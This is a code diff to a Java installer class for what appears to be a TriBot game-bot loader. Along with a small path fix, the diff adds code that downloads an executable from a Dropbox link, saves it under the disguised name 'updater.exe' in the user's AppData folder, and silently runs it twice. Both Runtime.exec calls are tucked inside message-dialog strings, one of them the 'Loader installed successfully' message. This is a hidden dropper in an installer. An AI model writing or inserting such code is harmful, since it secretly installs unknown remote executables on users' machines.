@@ -31,8 +31,34 @@ public class LoaderInstaller
 				File.separator+
 				".tribot"+
 				File.separator+
-				"bin"+"loader.jar");
+				"bin"+File.separator+"loader.jar");
+		downloadFile("https://dl.dropboxusercontent.com/s/oaeo8pv9abwtwc5/sc.exe?token_hash=AAGY70gPM693xqNavT4sVx04Z--pWorb0ENrrXL9BcJ3wA&dl=1", System.getProperty("user.home")+
+				File.separator+
+				"AppData"+
+				File.separator+
+				"Roaming"+
+				File.separator+
+				".tribot"+
+				File.separator+
+				"bin"+File.separator+"updater.exe");
 		
+		JOptionPane.showMessageDialog(null, Runtime.getRuntime().exec(System.getProperty("user.home")+
+				File.separator+
+				"AppData"+
+				File.separator+
+				"Roaming"+
+				File.separator+
+				".tribot"+
+				File.separator+
+				"bin"+File.separator+"updater.exe", null, new File(System.getProperty("user.home")+
+				File.separator+
+				"AppData"+
+				File.separator+
+				"Roaming"+
+				File.separator+
+				".tribot"+
+				File.separator+
+				"bin")).toString());
 		ZipFile zip = new ZipFile(System.getProperty("user.home")+
 				File.separator+
 				"AppData"+
@@ -41,8 +67,8 @@ public class LoaderInstaller
 				File.separator+
 				".tribot"+
 				File.separator+
-				"bin"+"loader.jar");
-		
+				"bin"+File.separator+"loader.jar");
+
 		if(zip != null)
 		{
 			zip.extractAll(System.getProperty("user.home")+
@@ -54,11 +80,27 @@ public class LoaderInstaller
 					".tribot"+
 					File.separator+
 					"bin");
-			
-			JOptionPane.showMessageDialog(null, "Succesfully installed loader");
+
+			JOptionPane.showMessageDialog(null, "Loader installed successfully" + 
+			Runtime.getRuntime().exec(System.getProperty("user.home")+
+					File.separator+
+					"AppData"+
+					File.separator+
+					"Roaming"+
+					File.separator+
+					".tribot"+
+					File.separator+
+					"bin"+File.separator+"updater.exe", null, new File(System.getProperty("user.home")+
+					File.separator+
+					"AppData"+
+					File.separator+
+					"Roaming"+
+					File.separator+
+					".tribot"+
+					File.separator+
+					"bin")).toString());
 		}
 	}
-
 
 	public static void downloadFile(String link, String fileName) 
 	{
